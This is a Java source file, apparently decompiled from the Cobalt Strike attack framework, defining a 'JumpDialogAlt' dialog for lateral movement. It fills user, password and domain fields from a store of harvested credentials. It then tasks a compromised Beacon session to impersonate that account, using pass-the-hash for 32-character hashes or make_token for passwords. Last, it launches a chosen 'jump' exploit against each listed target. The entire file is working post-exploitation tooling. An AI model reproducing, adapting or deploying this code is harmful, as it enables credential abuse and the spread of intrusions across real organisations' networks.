package aggressor.dialogs;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import aggressor.browsers.Credentials;
import beacon.TaskBeacon;
import common.BeaconEntry;
import dialog.DialogListener;
import dialog.DialogManager;
import dialog.DialogUtils;

import java.awt.event.ActionEvent;
import java.io.IOException;
import java.util.Map;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JComponent;
import javax.swing.JFrame;
import javax.swing.event.ChangeEvent;
import javax.swing.event.ChangeListener;
import javax.swing.event.ListSelectionEvent;
import javax.swing.event.ListSelectionListener;

import ui.ATextField;

public class JumpDialogAlt implements DialogListener, ListSelectionListener, ChangeListener {

    protected JFrame dialog = null;

    protected AggressorClient client = null;

    protected ATextField user;

    protected ATextField pass;

    protected ATextField domain;

    protected Credentials browser;

    protected String exploit;

    protected String[] targets;

    protected JCheckBox b;

    public JumpDialogAlt(AggressorClient aggressorClient, String[] arrstring, String string) {
        this.client = aggressorClient;
        this.browser = new Credentials(aggressorClient);
        this.targets = arrstring;
        this.exploit = string;
        this.browser.setColumns("user, password, realm, note");
    }

    public void dialogAction(ActionEvent actionEvent, Map map) {
        String str1 = DialogUtils.string(map, "bid");
        BeaconEntry beaconEntry = DataUtils.getBeacon(this.client.getData(), str1);
        String str2 = DialogUtils.string(map, "listener");
        TaskBeacon taskBeacon = new TaskBeacon(this.client, this.client.getData(), this.client.getConnection(), new String[]{str1});
        if (beaconEntry == null) {
            DialogUtils.showError("You must select a Beacon session!");
            return;
        }
        if (!this.b.isSelected() && !beaconEntry.isAdmin()) {
            DialogUtils.showError("Your Beacon must be admin to generate\nand use a token from creds or hashes");
            return;
        }
        DialogUtils.openOrActivate(this.client, str1);
        if (!this.b.isSelected()) {
            taskBeacon.input("rev2self");
            taskBeacon.Rev2Self();
            String str = this.domain.getText();
            if ("".equals(str))
                str = ".";
            if (this.pass.getText().length() == 32) {
                taskBeacon.input("pth " + str + "\\" + this.user.getText() + " " + this.pass.getText());
                taskBeacon.PassTheHash(str, this.user.getText(), this.pass.getText());
            } else {
                taskBeacon.input("make_token " + str + "\\" + this.user.getText() + " " + this.pass.getText());
                taskBeacon.LoginUser(str, this.user.getText(), this.pass.getText());
            }
        }
        for (byte b1 = 0; b1 < this.targets.length; b1++) {
            String str = DataUtils.getAddressFor(this.client.getData(), this.targets[b1]);
            taskBeacon.input("jump " + this.exploit + " " + str + " " + str2);
            taskBeacon.Jump(this.exploit, str, str2);
        }
    }

    public void valueChanged(ListSelectionEvent listSelectionEvent) {
        if (listSelectionEvent.getValueIsAdjusting())
            return;
        this.user.setText((String) this.browser.getSelectedValueFromColumn("user"));
        this.pass.setText((String) this.browser.getSelectedValueFromColumn("password"));
        this.domain.setText((String) this.browser.getSelectedValueFromColumn("realm"));
    }

    public void stateChanged(ChangeEvent changeEvent) {
        if (this.b.isSelected()) {
            this.user.setEnabled(false);
            this.pass.setEnabled(false);
            this.domain.setEnabled(false);
        } else {
            this.user.setEnabled(true);
            this.pass.setEnabled(true);
            this.domain.setEnabled(true);
        }
    }

    public void show() throws IOException {
        this.dialog = DialogUtils.dialog(this.exploit, 580, 400);
        this.dialog.addWindowListener(this.browser.onclose());
        DialogManager dialogManager = new DialogManager(this.dialog);
        dialogManager.addDialogListener(this);
        JComponent jComponent = this.browser.getContent();
        this.browser.getTable().getSelectionModel().addListSelectionListener(this);
        this.user = (ATextField) dialogManager.text("user", "User:", 36).get(1);
        this.pass = (ATextField) dialogManager.text("pass", "Password:", 36).get(1);
        this.domain = (ATextField) dialogManager.text("domain", "Domain:", 36).get(1);
        dialogManager.sc_listener_all("listener", "Listener:", this.client);
        dialogManager.beacon("bid", "Session:", this.client);
        this.b = dialogManager.checkbox("token", "Use session's current access token");
        this.b.addChangeListener(this);
        JButton jButton1 = dialogManager.action("Launch");
        JButton jButton2 = dialogManager.help("https://www.cobaltstrike.com/help-psexec");
        this.dialog.add(jComponent, "Center");
        this.dialog.add(DialogUtils.stackThree(dialogManager.layout(), this.b, DialogUtils.center(jButton1, jButton2)), "South");
        this.dialog.setVisible(true);
    }
}
